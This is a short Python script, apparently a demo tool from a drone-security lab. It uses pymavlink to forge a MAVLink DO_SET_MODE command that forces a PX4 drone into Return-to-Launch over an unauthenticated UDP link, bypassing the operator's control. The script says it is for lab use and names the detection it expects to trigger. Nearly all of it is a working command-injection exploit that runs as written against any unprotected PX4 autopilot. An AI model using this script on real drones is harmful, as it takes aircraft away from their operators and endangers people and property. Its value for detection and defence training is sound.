"""
Minimal MAVLink command-injection demo: forge a DO_SET_MODE (RTL) at the drone. Lab use only.

The drone speaks unauthenticated MAVLink on drone:14550/udp, bypassing c2 auth and claim-lock
(deliberate). Needs only the radio link, PX4 backend only (the mock speaks no MAVLink).
Sysid is fixed at 1. Expected detection: MAVLink command injection.

Usage:
    python tools/hijack.py [host] [port]       # defaults 127.0.0.1 14550
    HIJACK_IP / HIJACK_PORT env work like the positional args
    python tools/hijack.py 10.0.3.10           # from a remote host
"""
import os
import sys
import time

from pymavlink import mavutil

TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("HIJACK_IP", "127.0.0.1")
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("HIJACK_PORT", "14550"))
TARGET_SYSID = 1  # single-drone lab: sysid is fixed at 1

print(f"[*] MAVLink injection demo -> {TARGET_IP}:{TARGET_PORT} (target sysid {TARGET_SYSID})")

# udpout dials the target as a new ground station.
master = mavutil.mavlink_connection(
    f"udpout:{TARGET_IP}:{TARGET_PORT}", source_system=254
)

print("[*] Sniffing for target heartbeat...")
msg = master.recv_match(type="HEARTBEAT", blocking=True, timeout=5)
if not msg:
    print("[!] Target not found. Is the drone simulator running and reachable?")
    sys.exit(1)

target_system = master.target_system
target_component = master.target_component
print(f"[+] Target locked. System ID: {target_system}, Component ID: {target_component}")

print("[*] Injecting forged command: force 'Return to Launch' (RTL) mode")
# MAV_CMD_DO_SET_MODE (176) -> custom mode 6 is RTL in PX4.
master.mav.command_long_send(
    target_system,
    target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,  # confirmation
    1,  # base mode (custom)
    6,  # custom mode (RTL)
    0, 0, 0, 0, 0,
)

time.sleep(1)
print("[+] Payload delivered. An unprotected autopilot will now ignore c2 and fly home.")
